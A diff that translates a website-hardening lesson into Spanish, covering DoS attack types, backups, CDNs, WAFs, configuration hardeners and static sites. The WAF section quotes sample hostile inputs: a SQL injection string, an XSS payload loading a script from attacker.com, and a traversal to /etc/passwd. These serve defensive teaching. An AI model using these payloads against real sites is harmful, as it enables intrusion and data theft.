@@ -1,218 +1,235 @@
 +++
 style = "module"
 weight = 1
-title = "Website Hardening"
+title = "Fortificación del Sitio Web"
+description = "Exploramos algunos pasos iniciales que puede seguir para que su sitio web sea más resistente a los ataques."
 +++
 
-## Use Case
+## Caso de Uso
 
-There are a number of steps that can be taken to a website as a whole to make it more resilient to attack. These typically require less effort than going through the site page-by-page and can be quite impactful, so generally it’s a good idea to go through these actions first.
+Hay una serie de pasos que se pueden seguir en un sitio web en su conjunto para hacerlo más resistente a los ataques. Por lo general, requieren menos esfuerzo que revisar el sitio página por página y pueden tener un gran impacto, por lo que, en general, es una buena idea realizar estas acciones primero.
 
-## Objectives
+## Objetivos
 
-After completing this subtopic, the practitioner should be able to do the following:
+Después de completar este subtema, el profesional debe ser capaz de realizar lo siguiente:
 
-- Use development and maintenance processes that ensure that their site can be re-created if the production hosting servers are unavailable.
-- Use CDNs (content delivery networks) to protect their website from DoS attacks
-- Use static site generators to make their site more resistant to DoS and hacking
-- Use configuration hardeners and WAFs to make their site more resistant to hacking
+- Utilice procesos de desarrollo y mantenimiento que garanticen que su sitio pueda recrearse si los servidores de alojamiento de producción no están disponibles.
+- Utilice CDN (redes de entrega de contenido) para proteger su sitio web de ataques DoS
+- Utilice generadores de sitios estáticos para hacer que su sitio sea más resistente a DoS y piratería
+- Utilice refuerzos de configuración y WAF para hacer que su sitio sea más resistente a la piratería.
 
 ---
+## Sección Principal
 
-This sub-skill covers fundamental, site-wide activities that should be performed on almost any site that wishes to be protected against attacks. While every action may not apply to every site, some apply to all sites, and all apply to some.
+Esta sub-skill cubre actividades fundamentales en todo el sitio que deben realizarse en casi cualquier sitio que desee estar protegido contra ataques. Si bien es posible que no todas las acciones se apliquen a todos los sitios, algunas se aplican a todos los sitios y todas se aplican a algunos.
 
-## How website DoS attacks work
+### Cómo funcionan los ataques DoS a sitios web
 
-One of the key themes of this Learning Path is DoS attacks. In order to understand how to defend against and respond to these attacks, we need to understand how they work.
+Uno de los temas clave de esta Ruta de Aprendizaje son los ataques DoS. Para entender cómo defendernos y responder a estos ataques, debemos entender cómo funcionan.
 
-### Attack Types
+#### Tipos de Ataque
 
-DoS attacks can be broken down broadly by what layer of the application stack the attack targets, and whether the attack is volumetric or if it exploits bugs in the target software.
+Los ataques DoS se pueden desglosar en términos generales según la capa de la aplicación a la que se dirige el ataque y si el ataque es volumétrico o si explota errores en el software objetivo.
 
-#### Network-level attacks
+###### Ataques a nivel de red
 
-The lowest-level DoS attack type operates on the network level. The target of these attacks is the network connections between computers, routing equipment, and/or the operating system on the target. In a volumetric attack, the attacker will just send tons of network traffic to the target, trying to overwhelm the network or switching/routing capacity of the network devices connecting the target to the internet. Examples of this sort of attack are [ping floods](https://en.wikipedia.org/wiki/Ping_flood), [smurf attacks](https://en.wikipedia.org/wiki/Smurf_attack), and [NTP amplification attacks](https://www.cloudflare.com/learning/ddos/ntp-amplification-ddos-attack/).
+El tipo de ataque DoS de nivel más bajo opera a nivel de red. El objetivo de estos ataques son las conexiones de red entre computadoras, equipos de enrutamiento y/o el sistema operativo del objetivo. En un ataque volumétrico, el atacante simplemente enviará toneladas de tráfico de red al objetivo, tratando de abrumar la red o la capacidad de conmutación/enrutamiento de los dispositivos de red que conectan el objetivo a Internet. Ejemplos de este tipo de ataques son las [inundaciones de ping](https://en.wikipedia.org/wiki/Ping_flood), [los ataques smurf](https://es.wikipedia.org/wiki/Ataque_pitufo), y los [ataques de amplificación NTP](https://www.cloudflare.com/es-la/learning/ddos/ntp-amplification-ddos-attack/).
 
-From time to time a bug is found in a network device or server operating system that allows more efficient DoS attacks. These range from the classic “[ping of death](https://en.wikipedia.org/wiki/Ping_of_death)” from the 90’s, where a single packet could cause a server to crash, to more modern [hash collision issues](https://www.enyo.de/fw/security/notes/linux-dst-cache-dos.html).
+De vez en cuando se encuentra un error en un dispositivo de red o sistema operativo de servidor que permite ataques DoS más eficientes. Estos van desde el clásico “[ping de la muerte](https://es.wikipedia.org/wiki/Ping_de_la_muerte)” de los años 90, donde un solo paquete podía provocar la caída de un servidor, hasta los más modernos [problemas de colisión de hash](https://www.enyo.de/fw/security/notes/linux-dst-cache-dos.html) .
 
-#### Protocol-level attacks
+###### Ataques a nivel de protocolo
 
-One step up the network stack is protocol-level attacks. For web sites, these attacks will all use HTTP to try to overwhelm the web server or its backend infrastructure. Volumetric attacks are similar to network-level attacks; attackers just cause a large flood of traffic.
+Un paso adelante en la pila de red son los ataques a nivel de protocolo. Para los sitios web, todos estos ataques utilizarán HTTP para intentar saturar el servidor web o su infraestructura de backend. Los ataques volumétricos son similares a los ataques a nivel de red; los atacantes simplemente provocan una gran avalancha de tráfico.
 
-There also exist exploit-based DoS attacks at the protocol level; generally attacking the web server software. One example is the [HTTP slow POST attack](https://www.educative.io/answers/what-is-slow-http-post-dos-attack).
+También existen ataques DoS basados ​​en exploits a nivel de protocolo; generalmente atacando el software del servidor web. Un ejemplo es el [ataque HTTP POST lento](https://www.educative.io/answers/what-is-slow-http-post-dos-attack).
 
-#### Application-level attacks
+###### Ataques a nivel de aplicación
 
-The final class of DoS attack is the kind that attacks a resource-expensive feature of the target website itself. Since it’s specific to the target site, this kind of attack requires more technical skills than the other types, but can be extremely effective and hard to stop. In these attacks, the threat actor will identify a function on the web site that takes a lot of resources on the server side. Examples might include a page that resizes an image (can consume a lot of server memory), sends emails (can consume disproportionate network resources and affect mail server reputation), performs a complicated search (can consume a lot of database CPU and cache), etc.
+La última clase de ataque DoS es el que ataca una característica del sitio web objetivo que consume muchos recursos. Dado que es específico del sitio objetivo, este tipo de ataque requiere más habilidades técnicas que los otros tipos, pero puede ser extremadamente efectivo y difícil de detener. En estos ataques, el actor de amenaza identificará una función en el sitio web que consume muchos recursos del lado del servidor. Los ejemplos pueden incluir una página que cambia el tamaño de una imagen (puede consumir mucha memoria del servidor), envía correos electrónicos (puede consumir recursos de red desproporcionados y afectar la reputación del servidor de correo), realiza una búsqueda complicada (puede consumir una gran cantidad de CPU y caché de la base de datos), etc.
 
-These attacks usually serve to dramatically reduce the cost of a DoS attack to the attacker. Instead of sending tens or hundred of thousands of requests per second, the attacker may be able to render a web server unresponsive with mere hundred of requests per second. Not only does this reduce the cost of the attacker in terms of requests sent, the attacker can hide their traffic more easily, since the overall traffic volume may not be significant. Also, stopping these attacks usually requires changes to the site itself, which in some cases may be quite extensive.
+Estos ataques suelen servir para reducir drásticamente el coste de un ataque DoS para el atacante. En lugar de enviar decenas o cientos de miles de solicitudes por segundo, el atacante puede hacer que un servidor web no responda con solo cientos de solicitudes por segundo. Esto no solo reduce el costo del atacante en términos de solicitudes enviadas, sino que el atacante puede ocultar su tráfico más fácilmente, ya que el volumen de tráfico general puede no ser significativo. Además, detener estos ataques suele requerir cambios en el propio sitio, que en algunos casos pueden ser bastante extensos.
 
-### DoS vs DDoS
+#### DoS frente a DDoS
 
-A DDoS (distributed denial of service) attack is a type of DoS attack where the malicious traffic comes from a large number of sources. This is as opposed to a conventional attack, where a small number of computers send out the malicious traffic. As defenders have gained skills and abilities, effective attacks are generally DDoS attacks, as conventional attacks are easy to block, and frequently do not generate sufficient traffic. Most DDoS attacks involve attackers renting time on an existing [botnet](https://en.wikipedia.org/wiki/Botnet) or hiring a dedicated[ DDoS-for-hire service](https://krebsonsecurity.com/category/ddos-for-hire/), though some extortion gangs will have their own botnets.
+Un ataque DDoS (denegación de servicio distribuido) es un tipo de ataque DoS en el que el tráfico malicioso proviene de una gran cantidad de fuentes. Esto es lo opuesto a un ataque convencional, donde una pequeña cantidad de computadoras envían tráfico malicioso. A medida que los defensores han adquirido habilidades y destrezas, los ataques efectivos generalmente son ataques DDoS, ya que los ataques convencionales son fáciles de bloquear y frecuentemente no generan suficiente tráfico. La mayoría de los ataques DDoS implican que los atacantes alquilen tiempo en una [botnet](https://es.wikipedia.org/wiki/Botnet) existente o contraten un [servicio DDoS dedicado](https://krebsonsecurity.com/category/ddos-for-hire/), aunque algunas bandas de extorsión tendrán sus propias botnets.
 
-## Development and Site Maintenance Practices
+### Prácticas de Desarrollo y Mantenimiento del Sitio
 
-The most fundamental thing to help prepare for and respond to attacks is to be able to rebuild the site from scratch. This is important in DoS attacks, as the site may not just be unavailable to end users, but also to site owners. In some cases, hosting providers will take down a site that’s under attack, so as to prevent their systems from being overloaded. In a hacking attack, having a “clean” copy of the site is often essential for forensics and also for post-attack cleanup.
+Lo más fundamental para ayudar a prepararse y responder a los ataques es poder reconstruir el sitio desde cero. Esto es importante en los ataques DoS, ya que es posible que el sitio no sólo no esté disponible para los usuarios finales, sino también para los propietarios del sitio. En algunos casos, los proveedores de alojamiento cerrarán un sitio que esté bajo ataque para evitar que sus sistemas se sobrecarguen. En un ataque de piratería informática, tener una copia "limpia" del sitio suele ser esencial para los análisis forenses y también para la limpieza posterior al ataque.
 
-### Version Control
+#### Control de Versiones
 
-Site code and static content should be stored in a server-based version control system. Site developers are often attack targets themselves. For example, an [Azerbaijani web site owner was a victim of a phishing attack, and the attacker used their access to put a backdoor on the victim’s web site](https://www.qurium.org/alerts/targeted-sophisticated-phishing-attacks-against-dissidents-in-azerbaijan-is-trending/). Having a version control system, especially an externally managed one, can limit the impact of a compromise of a site maintainer. Additionally, having code and content stored remotely has other advantages if an accident, such as the loss of a laptop, occurs. Services such as [GitHub](https://docs.github.com/en) and [GitLab](https://about.gitlab.com/resources/) have free tiers that support the needs of individuals and small organizations.
+El código del sitio y el contenido estático deben almacenarse en un sistema de control de versiones basado en servidor. Los desarrolladores de sitios suelen ser ellos mismos el objetivo de los ataques. Por ejemplo, el [propietario de un sitio web azerbaiyano fue víctima de un ataque de phishing y el atacante utilizó su acceso para colocar una puerta trasera en el sitio web de la víctima](https://www.qurium.org/alerts/targeted-sophisticated-phishing-attacks-against-dissidents-in-azerbaijan-is-trending/). Tener un sistema de control de versiones, especialmente uno administrado externamente, puede limitar el impacto de comprometer a un mantenedor del sitio. Además, tener el código y el contenido almacenados de forma remota tiene otras ventajas si ocurre un accidente, como la pérdida de una computadora portátil. Servicios como [GitHub](https://docs.github.com/es) y [GitLab](https://about.gitlab.com/resources/) tienen niveles gratuitos que satisfacen las necesidades de individuos y pequeñas organizaciones.
 
-### Replicated Development Setup
+#### Configuración de Desarrollo Replicado
 
-If possible, site maintainers should have an isolated, access controlled environment where they can make and test changes to their website. This may be as simple as an unpublished, password-protected site on a provider like Wordpress.com or Wix, or a full multi-container Docker setup that allows a developer to have a complete environment on their laptop. In any case, making changes in production during an attack may be difficult or impossible, and it’s very easy to make mistakes in a high-stress situation. Having a separate development environment will allow site maintainers to make and test changes in a safe place before deploying those changes to production.
+Si es posible, los encargados del mantenimiento del sitio deben tener un entorno aislado y de acceso controlado donde puedan realizar y probar cambios en su sitio web. Esto puede ser tan simple como un sitio no publicado y protegido con contraseña en un proveedor como Wordpress.com o Wix, o una configuración Docker completa de múltiples contenedores que permita a un desarrollador tener un entorno completo en su computadora portátil. En cualquier caso, realizar cambios en la producción durante un ataque puede resultar difícil o imposible, y es muy fácil cometer errores en una situación de mucho estrés. Tener un entorno de desarrollo independiente permitirá a los mantenedores del sitio realizar y probar cambios en un lugar seguro antes de implementar esos cambios en producción.
 
-### Database backups
+#### Copias de seguridad de bases de datos
 
-If the website has a database, it’s important that that database be backed up and that those backups are tested. Ideally, backups should be made automatically, and old backups stored. That way, if an attacker manages to use a vulnerability like SQL injection to corrupt the database, a clean version can be restored, even if the attack isn’t detected immediately. If the database is small, it can be stored in the site’s version control system. Larger backups can be safely and inexpensively stored in systems like [AWS S3](https://aws.amazon.com/s3/) or [GCP’s Cloud Storage](https://cloud.google.com/storage?hl=en#backups-and-archives). The storage system, of course, needs to have access control enabled. Ideally, the processes that back up the data should only have permissions to add new files to the storage, not read, write, or delete existing data.
+Si el sitio web tiene una base de datos, es importante que se haga una copia de seguridad de esa base de datos y que se prueben esas copias de seguridad. Lo ideal es que las copias de seguridad se realicen automáticamente y se almacenen las copias de seguridad antiguas. De esa manera, si un atacante logra utilizar una vulnerabilidad como la inyección SQL para dañar la base de datos, se puede restaurar una versión limpia, incluso si el ataque no se detecta de inmediato. Si la base de datos es pequeña, se puede almacenar en el sistema de control de versiones del sitio. Las copias de seguridad más grandes se pueden almacenar de forma segura y económica en sistemas como [AWS S3](https://aws.amazon.com/es/s3/) o [Cloud Storage de GCP.](https://cloud.google.com/storage?hl=es#backups-and-archives). El sistema de almacenamiento, por supuesto, debe tener habilitado el control de acceso. Idealmente, los procesos que realizan copias de seguridad de los datos solo deberían tener permisos para agregar nuevos archivos al almacenamiento, no para leer, escribir ni eliminar datos existentes.
 
-## Using DoS resistant CDNs or hosting
+### Uso de CDN o hosting resistentes a DoS
 
-Since denial of service attacks are the most common threat facing civil society websites, a site owner’s next priority should be to set up basic defenses against DoS attacks. There are two ways of doing this: using a CDN with DoS protection or using a DoS-resistant hosting provider.
+Dado que los ataques de denegación de servicio son la amenaza más común que enfrentan los sitios web de la sociedad civil, la próxima prioridad de la persona propietaria de un sitio debería ser establecer defensas básicas contra los ataques DoS. Hay dos formas de hacer esto: usando una CDN con protección DoS o usando un proveedor de alojamiento resistente a DoS.
 
-### DoS resistant CDNs
+#### CDN resistentes a DoS
 
-CDNs (content delivery networks) originally served as a way to serve static web resources faster and with lower server costs. They were generally used by high-traffic websites. Usually, the website owner will use a special hostname (e.g. images.example.com) and give DNS control of that hostname to the CDN provider. The CDN provider has a large network of web servers, ideally placed near (in terms of network topology) to end users. These servers are called “edge” servers. When an end user performs a DNS lookup for that hostname, the CDN provider’s servers respond with the IP address of the “closest” CDN edge server. When the end user requests a resource (web page, image, sound file, etc.) from the edge server, the edge server first sees if it has the resource in its cache. If not, it requests the resource from the original website (called the “origin” server) and stores it in the cache. Once it has the resource in its cache, then it can serve it back to the end user. On subsequent requests, it will respond immediately with the cached resource. On a high-use website, this reduces load on the origin server and also results in lower network latency.
+Las CDN (redes de entrega de contenidos) sirvieron originalmente como una forma de ofrecer recursos web estáticos de forma más rápida y con menores costos de servidor. Generalmente eran utilizados por sitios web de mucho tráfico. Por lo general, el propietario del sitio web utilizará un nombre de host especial (por ejemplo, imágenes.ejemplo.com) y otorgará el control DNS de ese nombre de host al proveedor de CDN. El proveedor de CDN tiene una gran red de servidores web, idealmente ubicados cerca (en términos de topología de red) de los usuarios finales. Estos servidores se denominan servidores "permitrales". Cuando un usuario final realiza una búsqueda de DNS para ese nombre de host, los servidores del proveedor de CDN responden con la dirección IP del servidor perimetral de CDN "más cercano". Cuando el usuario final solicita un recurso (página web, imagen, archivo de sonido, etc.) del servidor perimetral, el servidor perimetral primero ve si tiene el recurso en su caché. De lo contrario, solicita el recurso del sitio web original (llamado servidor "origen") y lo almacena en la memoria caché. Una vez que tiene el recurso en su caché, puede devolverlo al usuario final. En solicitudes posteriores, responderá inmediatamente con el recurso almacenado en caché. En un sitio web de uso intensivo, esto reduce la carga en el servidor de origen y también da como resultado una menor latencia de la red.
 
-Over time the usefulness of CDNs for DoS protection became apparent. CDNs have lots of bandwidth capacity and specialized web server software, so can shrug off the onslaught of traffic from DoS attacks. This stops network level attacks, and most protocol-level attacks against static web content. For protection against protocol-level attacks against any page, websites will serve all content through the CDN, as opposed to just static content. Since the CDNs offer protection to multiple customers, they can develop specialized tools, techniques, and expertise in detecting and blocking DoS attacks.
+Con el tiempo, la utilidad de las CDN para la protección DoS se hizo evidente. Las CDN tienen mucha capacidad de ancho de banda y software de servidor web especializado, por lo que pueden resistir avalancha de tráfico de los ataques DoS. Esto detiene los ataques a nivel de red y la mayoría de los ataques a nivel de protocolo contra contenido web estático. Para protegerse contra ataques a nivel de protocolo contra cualquier página, los sitios web ofrecerán todo el contenido a través de la CDN, en lugar de solo contenido estático. Dado que las CDN ofrecen protección a múltiples clientes, pueden desarrollar herramientas, técnicas y experiencia especializadas para detectar y bloquear ataques DoS.
 
-Examples of DoS resistant CDN solutions include [Deflect](https://deflect.ca/non-profits/), [Project Shield](https://projectshield.withgoogle.com/landing), [Fastly](https://www.fastly.com/fast-forward), and [CloudFlare](https://www.cloudflare.com/galileo/).
+Ejemplos de soluciones CDN resistentes a DoS incluyen [Deflect](https://deflect.ca/non-profits/), [Project Shield](https://projectshield.withgoogle.com/landing?hl=es-419), [Fastly](https://www.fastly.com/es/fast-forward/), y [CloudFlare]https://www.cloudflare.com/es-la/galileo/).
 
-One important caveat of using a CDN to protect your website from DoS attacks is that it is imperative that you restrict traffic to your origin web servers. Let’s say that your web site, served through a CDN, uses the hostname [www.example.com](http://www.example.com), and you use origin.example.com for your “real” origin web server. If an attacker launches a DoS attack against origin.example.com, they will completely bypass the CDN, and your site will receive no benefit. Instead, origin web servers should have IP address restrictions in place at the network level (e.g. via a firewall), or ideally be completely cut off from the Internet and only accessible via a VPN.
+Una advertencia importante al utilizar una CDN para proteger su sitio web de ataques DoS es que es imperativo que restrinja el tráfico a sus servidores web de origen. Digamos que su sitio web, servido a través de una CDN, usa el nombre de host [www.example.com](http://www.example.com), y usted usa origin.example.com para su servidor web de origen "real". Si un atacante lanza un ataque DoS contra origin.example.com, omitirá por completo la CDN y su sitio no recibirá ningún beneficio. En cambio, los servidores web de origen deberían tener restricciones de dirección IP a nivel de red (por ejemplo, a través de un firewall) o, idealmente, estar completamente aislados de Internet y solo ser accesibles a través de una VPN.
 
-Additionally, there are certain misconfigurations that can cause a CDN edge server to not recognize static vs dynamic content. For example, if a website has a web page like [www.example.com/profile](http://www.example.com/profile), the CDN doesn’t automatically know that the page contains private information. The most standard way to work around this is to configure the CDN to cache based on response headers and then set a `Cache-Control` header whose value is `private` or similar. This will tell the CDN that the page contains private information, and to not give the same content to different users. The specifics of how this is configured and used will vary between CDN providers, so be sure to consult your provider’s documentation before setting up a CDN. It’s also a good idea to have a pre-release site that’s configured with the same CDN and settings as the production site. In this way, site managers can check major changes before going live.
+Además, existen ciertas configuraciones erróneas que pueden hacer que un servidor perimetral CDN no reconozca el contenido estático frente al dinámico. Por ejemplo, si un sitio web tiene una página como [www.example.com/profile](http://www.example.com/profile), la CDN no sabe automáticamente que la página contiene información privada. La forma más estándar de solucionar este problema es configurar la CDN para que almacene en caché en función de los encabezados de respuesta y luego establecer un encabezado Cache-Control cuyo valor sea private o similar. Esto le indicará a la CDN que la página contiene información privada y que no debe brindar el mismo contenido a diferentes usuarios. Los detalles específicos de cómo se configura y utiliza variarán entre los proveedores de CDN, así que asegúrese de consultar la documentación de su proveedor antes de configurar una CDN. También es una buena idea tener un sitio de prelanzamiento que esté configurado con la misma CDN y configuración que el sitio de producción. De esta manera, los administradores del sitio pueden verificar los cambios importantes antes de publicarlos.
 
-### DoS resistant hosting
+#### Alojamiento resistente a DoS
 
-Some providers combine web hosting with DoS resistance. Generally they have some of the same sort of technologies and practices that CDN providers use but bundled with web hosting. This avoids the issue above of protecting origin servers but depends on the provider providing both the protection and hosting services you need. Examples of DoS resistant hosting providers include [Qurium](https://www.qurium.org/secure-hosting/) and [Greenhost](https://greenhost.net/internet-freedom/).
+Algunos proveedores combinan alojamiento web con resistencia DoS. Generalmente tienen el mismo tipo de tecnologías y prácticas que utilizan los proveedores de CDN, pero incluidas con el alojamiento web. Esto evita el problema anterior de proteger los servidores de origen, pero depende de que el proveedor proporcione tanto la protección como los servicios de alojamiento que necesita. Ejemplos de proveedores de hosting resistentes a DoS incluyen [Qurium](https://www.qurium.org/secure-hosting/) y [Greenhost](https://greenhost.net/internet-freedom/).
 
-### Limitations of DoS resistant CDN and hosting providers
+#### Limitaciones de los proveedores de alojamiento y CDN resistentes a DoS
 
-You may have noted that the protection provided by DoS resistant CDN and hosting providers covers the majority of attacks, but the above material left out application-level attacks. There may be flaws in a website that allow DoS attacks with very low volumes. Standard defenses against DoS attacks are not effective in this case. That said, support and rapid response personnel at CDN and hosting providers may be able to help support web site owners in the event that there is an active application-level DoS attack against their website.
+Es posible que haya notado que la protección proporcionada por los proveedores de alojamiento y CDN resistentes a DoS cubre la mayoría de los ataques, pero el material anterior omitió los ataques a nivel de aplicación. Puede haber fallas en un sitio web que permitan ataques DoS con volúmenes muy pequeños. Las defensas estándar contra ataques DoS no son efectivas en este caso. Dicho esto, el personal de soporte y respuesta rápida de CDN y los proveedores de alojamiento pueden ayudar a los propietarios de sitios web en caso de que haya un ataque DoS activo a nivel de aplicación contra su sitio web.
 
-Defending against application-level attacks is covered in more depth in the DoS Incident Response subtopic (subtopic 3 in this learning path).
+La defensa contra ataques a nivel de aplicación se trata con más profundidad en el subtema Respuesta a Incidentes DoS (subtema 3 en esta ruta de aprendizaje).
 
-## Using Web Application Firewalls
+### Uso de Firewalls de Aplicaciones Web
 
-WAFs (web application firewalls) are network devices that sit in between an end user and a website’s origin server, like a CDN. While a CDN provides protection against DoS attacks, a WAF attempts to protect against hacking attacks. They will inspect incoming requests and block ones that look malicious, for example parameters containing things like `' or 1=1;--` (SQL injection), `">&lt;script src="http://attacker.com/payload.js">&lt;z a="` (XSS), or `../../../../../../etc/passwd` (directory traversal). While no WAF can provide perfect protection against hacking, they may be effective enough to protect a site from compromise, and almost always make the attacker’s job of identifying vulnerabilities more difficult. In most cases, a good WAF will not disrupt legitimate content, but it is possible for them to do so. For example, if a site was a discussion forum talking about secure web development, a WAF would likely block legitimate posts about attack techniques. As with CDNs, it’s a very good idea to have a pre-release site where changes can be tested before they go live.
+Los WAF (firewalls de aplicaciones web) son dispositivos de red que se encuentran entre un usuario final y el servidor de origen de un sitio web, como una CDN. Mientras que una CDN brinda protección contra ataques DoS, un WAF intenta proteger contra ataques de piratería. Inspeccionarán las solicitudes entrantes y bloquearán las que parezcan maliciosas, por ejemplo, parámetros que contengan cosas como `' or 1=1;--` (Inyección SQL), `">&lt;script src="<http://attacker.com/payload.js>"&gt;<z a="` (XSS), o `../../../../../../etc/passwd` (recorrido de directorio). Si bien ningún WAF puede brindar una protección perfecta contra la piratería, pueden ser lo suficientemente efectivos para proteger un sitio contra vulneraciones y casi siempre dificultan la tarea del atacante de identificar vulnerabilidades. En la mayoría de los casos, un buen WAF no alterará el contenido legítimo, pero es posible que lo haga. Por ejemplo, si un sitio fuera un foro de discusión sobre desarrollo web seguro, un WAF probablemente bloquearía publicaciones legítimas sobre técnicas de ataque. Al igual que con las CDN, es una muy buena idea tener un sitio de prelanzamiento donde se puedan probar los cambios antes de su publicación.
 
-Most DoS resistant CDNs also have WAF functions. There are also dedicated WAF providers who provide extra services, generally including DoS protection. For example, [Sucuri](https://sucuri.net/website-firewall/) is a WAF provider that also provides DoS protection and some backup and incident response capabilities. [WordFence](https://www.wordfence.com/products/pricing/) is a WAF provider that specializes in protecting sites built on WordPress. In addition to attempting to block generic hacking attempts and DoS attacks, it attempts to block attacks that specifically target WordPress sites.
+La mayoría de las CDN resistentes a DoS también tienen funciones WAF. También hay proveedores WAF dedicados que brindan servicios adicionales, que generalmente incluyen protección DoS. Por ejemplo, [Sucuri](https://sucuri.net/website-firewall/) es un proveedor de WAF que también brinda protección DoS y algunas capacidades de respaldo y respuesta a incidentes. [WordFence](https://www.wordfence.com/products/pricing/) es un proveedor de WAF que se especializa en proteger sitios creados en WordPress. Además de intentar bloquear intentos de piratería genéricos y ataques DoS, intenta bloquear ataques dirigidos específicamente a sitios de WordPress.
 
-There are also WAFs that are meant to be run on the same server or the network as the web site they’re protecting. Examples include expensive products by Barracuda and F5, and also open-source solutions such as [ModSecurity](https://github.com/SpiderLabs/ModSecurity). Note that these systems generally do not provide DoS protection on their own.
+También hay WAF que deben ejecutarse en el mismo servidor o red que el sitio web que están protegiendo. Como ejemplos podemos incluir productos costosos desarrollados por Barracuda y F5, así como soluciones de código abierto como [ModSecurity](https://github.com/SpiderLabs/ModSecurity). Tenga en cuenta que estos sistemas generalmente no brindan protección DoS por sí solos.
 
-## Configuration Hardeners
+### Fortificadores de Configuración
 
-Websites almost universally are built on some sort of framework that handles most of the work of serving web pages. That might be a low-level framework, like nginx, that only handles networking and basic HTTP, or a very high-level framework like WordPress, that handles everything except site content. In the vast majority of cases, the framework provides a suite of features, capabilities, and other configuration options, most of which aren’t needed by the website. These unneeded features and configurations expose the website to additional risk through increased attack surface (and potential for exposed bugs) or insecure configurations themselves.
+Los sitios web casi universalmente se construyen sobre algún tipo de framework que maneja la mayor parte del trabajo de servir páginas web. Podría ser un framework de bajo nivel, como nginx, que solo maneja redes y HTTP básico, o una estructura de muy alto nivel como WordPress, que maneja todo excepto el contenido del sitio. En la gran mayoría de los casos, el framework proporciona un conjunto de características, capacidades y otras opciones de configuración, la mayoría de las cuales no son necesarias para el sitio web. Estas características y configuraciones innecesarias exponen al sitio web a riesgos adicionales a través de una mayor superficie de ataque (y la posibilidad de errores expuestos) o configuraciones inseguras en sí mismas.
 
-While it’s possible to manually study the capabilities of a framework and decide how to enable features and configurations on one’s own, it’s generally far easier and more effective to use a tool or set of default baselines. These configuration hardeners usually represent thousands of hours of work to lock down a system as much as possible without rendering it unusable.
+Si bien es posible estudiar manualmente las capacidades de un framework y decidir cómo habilitar funciones y configuraciones por su cuenta, generalmente es mucho más fácil y efectivo usar una herramienta o un conjunto de líneas base predeterminadas. Estos fortalecedores de configuración suelen representar miles de horas de trabajo para bloquear un sistema tanto como sea posible sin dejarlo inutilizable.
 
-As with any system changes, it’s good, perhaps necessary, to have a separate environment in which to test changes, as well as a test process to make sure everything works properly before deploying changes to production. A site may depend upon an insecure configuration or little-used feature to work properly. In that case, it’s better to catch that before putting a reconfigured site in use.
+Al igual que con cualquier cambio en el sistema, es bueno, tal vez necesario, tener un entorno separado en el que probar los cambios, así como un proceso de prueba para asegurarse de que todo funcione correctamente antes de implementar los cambios en producción. Un sitio puede depender de una configuración insegura o de una característica poco utilizada para funcionar correctamente. En ese caso, es mejor detectarlo antes de poner en uso un sitio reconfigurado.
 
-The [DevSec Hardening Framework](https://dev-sec.io/baselines/) provides a set of security baselines for hardening a wide variety of commonly-used infrastructure software, such as Linux, MySQL, Apache, Docker, etc. Their baselines are documented on the web site, and they provide recipes for configuration managers such as Chef, Puppet, and Ansible.
+[DevSec Hardening Framework](https://dev-sec.io/baselines/) proporciona un conjunto de líneas base de seguridad para reforzar una amplia variedad de software de infraestructura de uso común, como Linux, MySQL, Apache, Docker, etc. Sus líneas de base están documentadas en el sitio web y proporcionan recetas para administradores de configuración como Chef, Puppet y Ansible.
 
-Other configuration hardeners go much deeper into the frameworks they secure. An example is [Snuffleupagus](https://snuffleupagus.readthedocs.io/), which secures PHP installations. In addition to supplying configuration changes, it changes the behavior of functions to make them less dangerous. For example, it changes the `system()` function to remove potentially dangerous characters from its input, and the `mail()` function to disallow features that can be used to write arbitrary files.
+Otros fortificadores de configuración profundizan mucho más en los frameworks que protegen. Un ejemplo es [Snuffleupagus](https://snuffleupagus.readthedocs.io/), que protege las instalaciones de PHP. Además de proporcionar cambios de configuración, cambia el comportamiento de las funciones para hacerlas menos peligrosas. Por ejemplo, cambia la función `system()` para eliminar caracteres potencialmente peligrosos de su entrada, y la función `mail()` para no permitir funciones que puedan usarse para escribir archivos arbitrarios.
 
-While configuration hardeners can’t eliminate every vulnerability from a website, and using them requires careful testing of the site afterwards, they are one of the easiest ways to shut down or slow down exploitation of a site.
+Si bien los fortificadores de configuración no pueden eliminar todas las vulnerabilidades de un sitio web y su uso requiere pruebas cuidadosas del sitio posteriormente, son una de las formas más fáciles de cerrar o ralentizar la explotación de un sitio.
 
-## Static Site Generators
+### Generadores de Sitios Estáticos
 
-Many websites use a content management system to manage the site, even though the content on the site doesn’t change for each visitor. While there are definitely sites that need to be updated multiple times a minute, or customize content for each visitor, most are essentially static sites. In this case, “static” means usually being updated every few hours or less. For convenience, most of these sites are dynamically generated on each visit. For normal use, that’s absolutely fine. However, for a site that’s being targeted, it presents some problems.
+Muchos sitios web utilizan un sistema de gestión de contenidos para gestionar el sitio, aunque el contenido del sitio no cambia para cada visitante. Si bien hay sitios que deben actualizarse varias veces por minuto o personalizar el contenido para cada visitante, la mayoría son sitios esencialmente estáticos. En este caso, "estático" significa que normalmente se actualiza cada pocas horas o menos. Para mayor comodidad, la mayoría de estos sitios se generan dinámicamente en cada visita. Para un uso normal, está absolutamente bien. Sin embargo, para un sitio siendo atacado, esto presenta algunos problemas.
 
-First of all, that dynamic behavior exposes more attack surface to adversaries. Instead of just being a web server and some files, the site is a complicated set of dynamic behavior backed up by a combination of files and databases. The latter is much more likely to contain a vulnerability that could be exploited by an attacker.
+En primer lugar, ese comportamiento dinámico expone más superficie de ataque a los adversarios. En lugar de ser simplemente un servidor web y algunos archivos, el sitio es un complicado conjunto de comportamiento dinámico respaldado por una combinación de archivos y bases de datos. Es mucho más probable que esta última contenga una vulnerabilidad que podría ser aprovechada por un atacante.
 
-Secondly, that complex assembly of databases and scripts takes much longer to generate a HTTP response than a static site. This additional processing complexity makes denial of service attacks much more effective.
+En segundo lugar, ese complejo conjunto de bases de datos y scripts tarda mucho más en generar una respuesta HTTP que un sitio estático. Esta complejidad de procesamiento adicional hace que los ataques de denegación de servicio sean mucho más efectivos.
 
-In short, if a website can work as a static site, it will be much more resilient as a static site than as a dynamic site. It also expands the site’s hosting options and lowers hosting costs, as the site can be served with things like cloud providers’ storage buckets, GitHub pages, etc.
+En resumen, si un sitio web puede funcionar como sitio estático, será mucho más resistente como sitio estático que como sitio dinámico. También amplía las opciones de alojamiento del sitio y reduce los costos de alojamiento, ya que el sitio puede recibir servicios como depósitos de almacenamiento de proveedores de servicios en la nube, páginas de GitHub, etc.
 
